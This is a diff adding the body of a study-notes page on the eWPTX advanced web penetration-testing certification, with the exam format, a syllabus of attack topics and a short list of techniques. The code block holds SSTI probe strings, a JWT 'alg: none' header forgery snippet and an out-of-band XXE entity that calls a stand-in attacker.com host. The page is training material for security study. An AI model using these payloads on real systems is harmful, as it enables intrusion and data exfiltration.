@@ -164,6 +164,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#ewptx" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -2356,6 +2361,26 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    eWPTX
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -2373,6 +2398,58 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#exam-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exam Format
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syllabus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Syllabus
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2825,6 +2902,49 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#exam-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exam Format
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syllabus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Syllabus
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -2844,9 +2964,78 @@
   
 
 
-  <h1>eWPTX</h1>
-
-
+<h1 id="ewptx">eWPTX<a class="headerlink" href="#ewptx" title="Permanent link">&para;</a></h1>
+<p><strong>eLearnSecurity Web Application Penetration Tester eXtreme</strong> — advanced web exploitation covering techniques beyond OWASP Top 10.</p>
+<h2 id="exam-format">Exam Format<a class="headerlink" href="#exam-format" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Duration:</strong> 7 days</li>
+<li><strong>Format:</strong> Black-box advanced web assessment</li>
+<li><strong>Deliverable:</strong> Technical report</li>
+</ul>
+<h2 id="syllabus">Syllabus<a class="headerlink" href="#syllabus" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Topics</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Advanced XSS</td>
+<td>DOM clobbering, mutation XSS, CSP bypass, BeEF</td>
+</tr>
+<tr>
+<td>Advanced SQLi</td>
+<td>Out-of-band exfiltration, stacked queries, WAF bypass</td>
+</tr>
+<tr>
+<td>Encoding &amp; Evasion</td>
+<td>Unicode, polyglots, double encoding, HPP</td>
+</tr>
+<tr>
+<td>XML &amp; XPATH</td>
+<td>XXE, XPATH injection, OOB XXE</td>
+</tr>
+<tr>
+<td>Deserialization</td>
+<td>PHP, Java, Python object deserialization</td>
+</tr>
+<tr>
+<td>Web Services</td>
+<td>SOAP/REST attacks, WSDL enumeration, mass assignment</td>
+</tr>
+<tr>
+<td>OAuth &amp; JWT</td>
+<td>Token forgery, alg:none, key confusion</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>Cloud metadata, pivot to internal, Gopher protocol</td>
+</tr>
+<tr>
+<td>SSTI</td>
+<td>Jinja2, Twig, Velocity, Freemarker template injection</td>
+</tr>
+<tr>
+<td>Race Conditions</td>
+<td>Parallel requests, TOCTOU in web apps</td>
+</tr>
+</tbody>
+</table>
+<h2 id="key-techniques">Key Techniques<a class="headerlink" href="#key-techniques" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># SSTI detection</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span>  <span class="c1"># 49 = vulnerable</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="err">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span>   <span class="c1"># Freemarker/Velocity</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="o">&lt;%=</span> <span class="mi">7</span><span class="o">*</span><span class="mi">7</span> <span class="o">%&gt;</span>  <span class="c1"># ERB</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># JWT none algorithm</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">header</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;alg&quot;</span><span class="p">:</span><span class="s2">&quot;none&quot;</span><span class="p">,</span><span class="s2">&quot;typ&quot;</span><span class="p">:</span><span class="s2">&quot;JWT&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c1"># XXE OOB</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="o">&lt;</span><span class="err">!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">xxe</span> <span class="n">SYSTEM</span> <span class="s2">&quot;http://attacker.com/dtd&quot;</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">xxe</span><span class="p">;</span>
+</span></code></pre></div>
 
 
 
